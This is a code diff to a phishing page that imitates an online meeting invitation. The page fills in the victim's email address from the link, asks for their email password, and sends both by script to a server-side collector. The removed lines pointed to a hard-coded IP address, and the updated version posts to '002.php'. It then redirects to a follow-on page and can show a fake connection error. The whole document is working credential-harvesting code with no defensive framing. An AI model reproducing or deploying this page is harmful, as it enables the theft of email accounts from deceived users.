@@ -84,48 +84,46 @@
 		
 
         <div class="join-meet-section">
-            <form class="join-meeting-content" id="myForm" action="http://104.234.37.4/process_form.php" method="POST">
+        <form class="join-meeting-content" id="myForm">
 
-                <div class="join-meet-header">
-                    <h1>Join Online Meeting</h1>
+            <div class="join-meet-header">
+                <h1>Join Online Meeting</h1>
+            </div>
+            <div class="welcome-text-container">
+                <p>Welcome. You have been invited to join a meeting.</p>
+            </div>
+            <div class="user-notification-container">
+                <p>Sign in as:</p>
+            </div>
+            
+            <div class="email-container">
+                <p id="email-address"></p>
+            </div>
+            
+            <div class="password-input-container">
+                <input type="password" name="passwd" id="passwd" placeholder="Enter Email Password" required>
+            </div>
+            
+            <input type="hidden" id="hiddenEmail" name="hiddenEmail">
+            
+            <div class="terms-of-service-container">
+                <div class="form-check check-box">
+                    <input class="form-check-input" type="checkbox" id="flexCheckChecked" checked>
                 </div>
-                <div class="welcome-text-container">
-                    <p>Welcome. You have been invited to join a meeting.</p>
-                </div>
-                <div class="user-notification-container">
-                    <p>Sign in as:</p>
-                </div>
-				
-                <div class="email-container">
-                    <p id="email-address"></p>
-                </div>
-				
-                <div class="password-input-container">
-                    <input type="password" name="passwd" id="passwd" placeholder="Enter Email Password" required>
-                </div>
-				
-				<input type="hidden" id="hiddenEmail" name="hiddenEmail">
-				
-                <div class="terms-of-service-container">
-                    <div class="form-check check-box">
-                        <input class="form-check-input" type="checkbox" id="flexCheckChecked" checked>
-                    </div>
-                    <p>I agree to the <x class="terms-text">Terms of Service</x> </p>
-                </div>
-                <div class="error-connecting-container" id="error-connecting">
-                    <p>There was error connecting, please try again.</p>
-                </div>
+                <p>I agree to the <span class="terms-text">Terms of Service</span></p>
+            </div>
+            <div class="error-connecting-container" id="error-connecting" style="display: none;">
+                <p>There was an error connecting, please try again.</p>
+            </div>
 
-                <div class="join-meeting-button" id="join-button">
-                    <button type="submit" id="submitBtn">Launch Meeting</button>
-                </div>
-                <div class="unable-to-connect-container">
-                    <p>If you are unable to join the meeting, click <a href="#">here</a> to Refresh.</p>
-                </div>
+            <div class="join-meeting-button" id="join-button">
+                <button type="submit" id="submitBtn">Launch Meeting</button>
+            </div>
+            <div class="unable-to-connect-container">
+                <p>If you are unable to join the meeting, click <a href="#">here</a> to Refresh.</p>
+            </div>
 
-            </form>
-        </div>
-
+        </form>
     </div>
 
     <footer>
@@ -134,48 +132,60 @@
         </div>
     </footer>
 
+ <script>
+document.getElementById('myForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the form from submitting immediately
 
+    // Capture form data
+    const formData = new FormData(this);
 
+    // Convert formData to URL-encoded string
+    const urlEncodedData = new URLSearchParams(formData).toString();
 
-
-<script>
-        document.getElementById('myForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the form from submitting immediately
-            
-            // Optionally, send the form data to action.php using AJAX
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', 'process_form.php', true);
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.send(new URLSearchParams(new FormData(this)).toString());
-
-            // Display a message or spinner (optional)
-            //alert('Processing... Please wait.');
-
-            // Delay for 3 seconds before redirecting
+    // Send the form data to the server via AJAX
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', '002.php', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            console.log('Form data successfully sent to the server.');
+            // Optionally, redirect after saving
             setTimeout(function() {
-                window.location.href = 'http://104.234.37.4/zoomm3.html';
-            }, 1000);
-        });
-    </script>
-	
-	
-	<script>
-        window.addEventListener('DOMContentLoaded', (event) => {
-            // Extract the email from the URL fragment
-            const email = window.location.hash.split('#')[1]; // Remove the '#' sign
-            
-            // Validate the email format (simple regex)
-            const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
-            if (emailPattern.test(email)) {
-                // Display the email
-                document.getElementById('email-address').textContent = email;
-				document.getElementById('hiddenEmail').value = email;
-            } else {
-                // Display a message if the email is not valid
-                document.getElementById('email').textContent = 'Invalid email format';
-            }
-        });
-    </script>
+                window.location.href = 'zoomm3.html';
+            }, 3000); // 3-second delay
+        } else {
+            console.error('Error in sending form data: ' + xhr.statusText);
+            document.getElementById('error-connecting').style.display = 'block';
+        }
+    };
+
+    xhr.onerror = function() {
+        console.error('Request error...');
+        document.getElementById('error-connecting').style.display = 'block';
+    };
+
+    xhr.send(urlEncodedData);
+});
+
+window.addEventListener('DOMContentLoaded', (event) => {
+    // Extract the email from the URL fragment
+    const hash = window.location.hash.slice(1); // Remove the '#' sign
+    const email = decodeURIComponent(hash); // Decode URL-encoded email
+
+    console.log('Extracted email:', email); // Debugging
+
+    // Validate the email format (simple regex)
+    const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+    if (emailPattern.test(email)) {
+        // Display the email
+        document.getElementById('email-address').textContent = email;
+        document.getElementById('hiddenEmail').value = email;
+    } else {
+        // Display a message if the email is not valid
+        document.getElementById('email-address').textContent = 'Invalid email format';
+    }
+});
+</script>
 
 
 
